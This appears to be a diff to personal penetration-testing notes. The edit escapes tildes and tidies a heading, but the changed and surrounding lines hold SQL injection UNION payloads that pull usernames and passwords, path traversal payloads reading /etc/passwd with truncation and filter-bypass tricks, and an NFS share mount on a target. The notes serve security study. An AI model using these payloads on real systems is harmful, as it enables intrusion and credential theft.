@@ -640,8 +640,8 @@ creating the physical folder that will hold the data.
 Done in the system that needs the files which are available in target machine  
 Entry point for the target machine
 
-<span class="cmd">mkdir ~/target_nfs</span>  
-<span class="cmd">mount [MACHINE_IP]:[path to share] ~/target_nfs</span>
+<span class="cmd">mkdir \\~/target_nfs</span>  
+<span class="cmd">mount [MACHINE_IP]:[path to share] \\~/target_nfs</span>
 
 Any file that we place in the target system's share folder, will be accessible in our system
 
@@ -782,8 +782,8 @@ Eg: <span class="cmd">' UNION SELECT NULL, username, password, NULL FROM users--
 Conatenation: Refer cheatsheet for syntax  
 If only 1 column accepts strings, concatenate both fields with a delimiter  
 For eg:   
-	<span class="cmd">' UNION SELECT null, username || '~' || password FROM users--</span>  
-Use delimiter like '~' or '@' in the middle to make out the different fields
+	<span class="cmd">' UNION SELECT null, username || '\\~' || password FROM users--</span>  
+Use delimiter like '\\~' or '@' in the middle to make out the different fields
 
 # Reading Files
 
@@ -909,7 +909,7 @@ Null byte <span class="cmd">**%00**</span> can also be used
 • Sometimes string max length is 4096 in older versions of php so long strings will be truncated  
 	So create long ones that evaluate to correct path - appended extension also will be truncated  
 	But we have to start with non-existent directory  
-	Eg: <span class="cmd">?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times</span>  
+	Eg: <span class="cmd">?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED \\~2048 times</span>  
 <span class="cmd">echo -n "[non_existing_directory]/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done</span>  
 • We can use multiple ../ like previously but exact length of string must be calculated - only .php must get truncated
 
@@ -918,11 +918,7 @@ Null byte <span class="cmd">**%00**</span> can also be used
 If a directory is always required in the input:  
 Add it in the start and traverse out of it. One extra <span class="cmd">**../**</span> in the payload
 
-## Stripping
-
-## <span class="cmd">**../**</span>
-
-## from input
+## Stripping ../ from input
 
 Use <span class="cmd">**....//**</span> instead  
 When <span class="cmd">../</span> from each <span class="cmd">....//</span>, it leaves <span class="cmd">../</span>
